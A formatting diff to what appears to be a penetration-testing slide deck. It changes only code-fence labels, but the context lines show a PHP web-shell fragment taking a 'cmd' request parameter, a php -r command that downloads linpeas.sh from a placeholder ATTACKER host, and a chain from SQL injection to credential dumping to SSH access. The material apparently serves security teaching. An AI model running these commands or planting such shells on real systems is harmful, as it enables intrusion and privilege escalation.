@@ -12,7 +12,7 @@ paginate: true
 
 ## Injection Testing Methodology
 
-```
+```text
 For EACH entry point discovered:
 
 1. Identify the input type (string, numeric, JSON, etc.)
@@ -260,7 +260,7 @@ if(isset($_REQUEST['cmd'])){
 
 ## Chaining Vulnerabilities
 
-```
+```text
 Real-world exploitation often chains multiple lower-severity
 vulnerabilities into a critical attack:
 
@@ -361,7 +361,7 @@ php -r "file_put_contents('linpeas.sh', file_get_contents('http://ATTACKER/linpe
 
 ## Common Exploitation Patterns
 
-```
+```text
 Pattern 1: Credentials -> SSH Access
   1. Find SQL injection
   2. Dump user credentials from database
